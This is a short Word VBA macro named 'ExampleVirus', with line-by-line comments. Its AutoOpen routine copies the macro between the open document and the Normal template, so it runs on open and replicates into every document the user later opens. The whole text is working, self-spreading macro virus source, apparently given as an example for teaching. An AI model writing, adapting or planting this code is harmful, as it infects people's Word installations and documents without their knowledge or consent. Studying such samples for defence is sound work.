Attribute VB_Name = "ExampleVirus"
Sub AutoOpen()
'1st line: if the active document's name is Normal then
'2nd line: copy the macro ExampleVirus from the active document to the normal template; the macro is a project item
'3rd line: but if the name of the active document ain't normal.dot then
'4th line: copy the macro ExampleVirus from the notmal template to the active document; the macro is a project item
If UCase(ThisDocument.Name) = "NORMAL.DOT" Then
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "ExampleVirus", wdOrganizerObjectProjectItems
Else
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "ExampleVirus", wdOrganizerObjectProjectItems
End If
End Sub
